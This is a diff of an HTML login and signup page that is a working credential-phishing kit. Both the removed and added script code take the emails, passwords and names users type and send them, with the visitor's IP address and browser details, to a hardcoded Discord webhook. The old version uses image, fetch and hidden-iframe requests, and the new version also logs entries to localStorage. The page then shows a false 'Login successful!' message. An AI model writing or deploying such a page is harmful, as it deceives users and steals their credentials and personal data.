@@ -3,16 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Login</title>
+    <title>Secure Login</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Arial', sans-serif;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Arial', sans-serif; 
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
@@ -20,61 +15,54 @@
             justify-content: center;
             padding: 20px;
         }
-        
-        .login-container {
+        .container {
             background: white;
             padding: 40px;
             border-radius: 15px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.1);
             width: 100%;
-            max-width: 400px;
+            max-width: 450px;
         }
-        
-        .login-header {
-            text-align: center;
+        .tabs {
+            display: flex;
             margin-bottom: 30px;
+            border-bottom: 2px solid #eee;
         }
-        
-        .login-header h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-        
-        .login-header p {
+        .tab {
+            padding: 12px 20px;
+            cursor: pointer;
+            border: none;
+            background: none;
+            font-size: 16px;
+            font-weight: 600;
             color: #666;
-            font-size: 14px;
+            flex: 1;
+            text-align: center;
         }
-        
+        .tab.active {
+            color: #667eea;
+            border-bottom: 3px solid #667eea;
+        }
         .form-group {
             margin-bottom: 20px;
         }
-        
         label {
             display: block;
             margin-bottom: 8px;
             color: #333;
             font-weight: 600;
-            font-size: 14px;
         }
-        
-        input[type="email"],
-        input[type="password"] {
+        input {
             width: 100%;
             padding: 12px 15px;
             border: 2px solid #e1e5e9;
             border-radius: 8px;
             font-size: 14px;
-            transition: all 0.3s ease;
         }
-        
-        input[type="email"]:focus,
-        input[type="password"]:focus {
+        input:focus {
             outline: none;
             border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
         }
-        
         .submit-btn {
             width: 100%;
             padding: 12px;
@@ -85,102 +73,184 @@
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: transform 0.2s ease;
         }
-        
-        .submit-btn:hover {
-            transform: translateY(-2px);
+        .form-content {
+            display: none;
         }
-        
-        .form-footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 12px;
+        .form-content.active {
+            display: block;
         }
-        
         .message {
             padding: 12px;
             border-radius: 8px;
             margin-bottom: 20px;
             text-align: center;
-            display: none;
         }
-        
         .success {
             background: #d4edda;
             color: #155724;
-            border: 1px solid #c3e6cb;
+        }
+        .admin-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .admin-link a {
+            color: #667eea;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-header">
-            <h1>Welcome Back</h1>
-            <p>Please sign in to your account</p>
+    <div class="container">
+        <div class="tabs">
+            <button class="tab active" onclick="showForm('login')">Login</button>
+            <button class="tab" onclick="showForm('signup')">Sign Up</button>
+        </div>
+
+        <div id="login-form" class="form-content active">
+            <h2 style="text-align: center; margin-bottom: 20px;">Welcome Back</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" id="loginEmail" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="loginPassword" required>
+                </div>
+                <button type="submit" class="submit-btn">Sign In</button>
+            </form>
+        </div>
+
+        <div id="signup-form" class="form-content">
+            <h2 style="text-align: center; margin-bottom: 20px;">Create Account</h2>
+            <form id="signupForm">
+                <div class="form-group">
+                    <label>Full Name</label>
+                    <input type="text" id="signupName" required>
+                </div>
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" id="signupEmail" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="signupPassword" required>
+                </div>
+                <button type="submit" class="submit-btn">Create Account</button>
+            </form>
         </div>
 
         <div id="message" class="message"></div>
-
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" name="email" placeholder="Enter your email" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Enter your password" required>
-            </div>
-            
-            <button type="submit" class="submit-btn">Sign In</button>
-        </form>
         
-        <div class="form-footer">
-            <p>By continuing, you agree to our Terms of Service</p>
+        <div class="admin-link">
+            <a href="admin.html">Admin Dashboard</a>
         </div>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        // REPLACE WITH YOUR DISCORD WEBHOOK
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P';
+
+        function showForm(formType) {
+            document.getElementById('login-form').classList.remove('active');
+            document.getElementById('signup-form').classList.remove('active');
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.getElementById(formType + '-form').classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+
+        function getBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                time: new Date().toLocaleString()
+            };
+        }
+
+        // Save data to localStorage
+        function saveLoginData(data) {
+            let logins = JSON.parse(localStorage.getItem('loginData') || '[]');
+            logins.push(data);
+            localStorage.setItem('loginData', JSON.stringify(logins));
+        }
+
+        // Login form
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            // Show success message immediately
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            const ip = await getIP();
+            const browser = getBrowserInfo();
+
+            const loginData = {
+                type: 'LOGIN',
+                email: email,
+                password: password,
+                ip: ip,
+                browser: browser,
+                timestamp: new Date().toISOString()
+            };
+
+            // Save locally
+            saveLoginData(loginData);
+
+            // Send to Discord
+            const discordMsg = `**🔐 LOGIN**\n📧 ${email}\n🔑 ${password}\n🌐 ${ip}\n🖥️ ${browser.platform}\n⏰ ${browser.time}`;
+            new Image().src = `${DISCORD_WEBHOOK}?content=${encodeURIComponent(discordMsg)}`;
+
             showMessage('Login successful!', 'success');
-            
-            // Method 1: Image GET request (most reliable)
-            const img = new Image();
-            img.src = `https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P?content=🔐 NEW LOGIN 📧 Email: ${encodeURIComponent(email)} 🔑 Password: ${encodeURIComponent(password)}`;
-            
-            // Method 2: Fetch with GET (backup)
-            fetch(`https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P?content=🔐+LOGIN+📧+Email:+${encodeURIComponent(email)}+🔑+Password:+${encodeURIComponent(password)}`, {
-                method: 'GET',
-                mode: 'no-cors'
-            });
-            
-            // Method 3: Iframe GET request (another backup)
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = `https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P?content=LOGIN+${encodeURIComponent(email)}+${encodeURIComponent(password)}`;
-            document.body.appendChild(iframe);
-            
-            // Clear form
-            document.getElementById('loginForm').reset();
+            this.reset();
         });
-        
+
+        // Signup form
+        document.getElementById('signupForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const name = document.getElementById('signupName').value;
+            const email = document.getElementById('signupEmail').value;
+            const password = document.getElementById('signupPassword').value;
+            const ip = await getIP();
+            const browser = getBrowserInfo();
+
+            const signupData = {
+                type: 'SIGNUP',
+                name: name,
+                email: email,
+                password: password,
+                ip: ip,
+                browser: browser,
+                timestamp: new Date().toISOString()
+            };
+
+            // Save locally
+            saveLoginData(signupData);
+
+            // Send to Discord
+            const discordMsg = `**📝 SIGNUP**\n👤 ${name}\n📧 ${email}\n🔑 ${password}\n🌐 ${ip}\n🖥️ ${browser.platform}\n⏰ ${browser.time}`;
+            new Image().src = `${DISCORD_WEBHOOK}?content=${encodeURIComponent(discordMsg)}`;
+
+            showMessage('Account created!', 'success');
+            this.reset();
+        });
+
         function showMessage(text, type) {
             const messageDiv = document.getElementById('message');
             messageDiv.textContent = text;
             messageDiv.className = 'message ' + type;
             messageDiv.style.display = 'block';
-            
-            setTimeout(() => {
-                messageDiv.style.display = 'none';
-            }, 3000);
+            setTimeout(() => messageDiv.style.display = 'none', 3000);
         }
     </script>
 </body>
